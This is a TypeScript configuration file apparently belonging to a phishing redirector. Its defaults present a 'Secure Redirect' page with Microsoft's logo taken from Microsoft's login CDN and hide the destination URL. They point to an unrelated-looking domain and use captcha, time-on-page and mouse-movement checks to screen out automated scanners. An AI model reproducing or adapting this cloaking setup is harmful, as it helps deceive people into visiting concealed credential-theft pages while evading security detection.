export interface Config {
  defaultTargetUrl: string;
  headerTitle: string;
  headerSubtitle: string;
  logoUrl: string;
  defaultCaptcha: 'google' | 'cloudflare';
  showDestinationUrl: boolean;
  theme: {
    primaryColor: string;
    backgroundColor: string;
    textColor: string;
  };
  recaptcha: {
    siteKey: string;
    minScore: number;
    maxAttempts: number;
    cooldownPeriod: number; // in milliseconds
    minTimeOnPage: number; // in seconds
    minMouseMovements: number;
  };
  turnstile: {
    siteKey: string;
    maxAttempts: number;
    cooldownPeriod: number; // in milliseconds
  };
}

export const defaultConfig: Config = {
  defaultTargetUrl: 'https://osgt.wbujrne.es/zPa@A8qf5H6XlPGVm6/',
  headerTitle: 'Secure Redirect',
  headerSubtitle: 'Please verify to continue',
  logoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
  defaultCaptcha: 'google',
  showDestinationUrl: false,
  theme: {
    primaryColor: '#3B82F6',
    backgroundColor: '#F9FAFB',
    textColor: '#1F2937',
  },
  recaptcha: {
    siteKey: '6Ldj3y4rAAAAADLtOdNaoFThz4gm1FSv0XZaJQtq',
    minScore: 0.5,
    maxAttempts: 5,
    cooldownPeriod: 3600000, // 1 hour
    minTimeOnPage: 3,
    minMouseMovements: 5
  },
  turnstile: {
    siteKey: '0x4AAAAAABnRdpfaMbUQSNqT',
    maxAttempts: 5,
    cooldownPeriod: 3600000 // 1 hour
  }
};

export const validateConfig = (config: Partial<Config>): Partial<Config> => {
  const validatedConfig: Partial<Config> = {};

  if (config.defaultTargetUrl) {
    try {
      new URL(config.defaultTargetUrl);
      validatedConfig.defaultTargetUrl = config.defaultTargetUrl;
    } catch (e) {
      console.warn('Invalid default target URL provided');
    }
  }

  if (config.headerTitle) {
    validatedConfig.headerTitle = config.headerTitle.slice(0, 50);
  }

  if (config.headerSubtitle) {
    validatedConfig.headerSubtitle = config.headerSubtitle.slice(0, 100);
  }

  if (config.logoUrl) {
    try {
      new URL(config.logoUrl);
      validatedConfig.logoUrl = config.logoUrl;
    } catch (e) {
      console.warn('Invalid logo URL provided');
    }
  }

  if (config.defaultCaptcha) {
    const validCaptchas = ['google', 'cloudflare'];
    if (validCaptchas.includes(config.defaultCaptcha)) {
      validatedConfig.defaultCaptcha = config.defaultCaptcha as Config['defaultCaptcha'];
    }
  }

  if (config.showDestinationUrl !== undefined) {
    validatedConfig.showDestinationUrl = Boolean(config.showDestinationUrl);
  }

  if (config.theme) {
    validatedConfig.theme = {
      primaryColor: /^#[0-9A-F]{6}$/i.test(config.theme.primaryColor)
        ? config.theme.primaryColor
        : defaultConfig.theme.primaryColor,
      backgroundColor: /^#[0-9A-F]{6}$/i.test(config.theme.backgroundColor)
        ? config.theme.backgroundColor
        : defaultConfig.theme.backgroundColor,
      textColor: /^#[0-9A-F]{6}$/i.test(config.theme.textColor)
        ? config.theme.textColor
        : defaultConfig.theme.textColor,
    };
  }

  if (config.recaptcha) {
    validatedConfig.recaptcha = {
      siteKey: config.recaptcha.siteKey || defaultConfig.recaptcha.siteKey,
      minScore: Math.max(0, Math.min(1, config.recaptcha.minScore)) || defaultConfig.recaptcha.minScore,
      maxAttempts: Math.max(1, Math.min(10, config.recaptcha.maxAttempts)) || defaultConfig.recaptcha.maxAttempts,
      cooldownPeriod: Math.max(0, config.recaptcha.cooldownPeriod) || defaultConfig.recaptcha.cooldownPeriod,
      minTimeOnPage: Math.max(0, config.recaptcha.minTimeOnPage) || defaultConfig.recaptcha.minTimeOnPage,
      minMouseMovements: Math.max(0, config.recaptcha.minMouseMovements) || defaultConfig.recaptcha.minMouseMovements
    };
  }

  if (config.turnstile) {
    validatedConfig.turnstile = {
      siteKey: config.turnstile.siteKey || defaultConfig.turnstile.siteKey,
      maxAttempts: Math.max(1, Math.min(10, config.turnstile.maxAttempts)) || defaultConfig.turnstile.maxAttempts,
      cooldownPeriod: Math.max(0, config.turnstile.cooldownPeriod) || defaultConfig.turnstile.cooldownPeriod
    };
  }

  return validatedConfig;
};
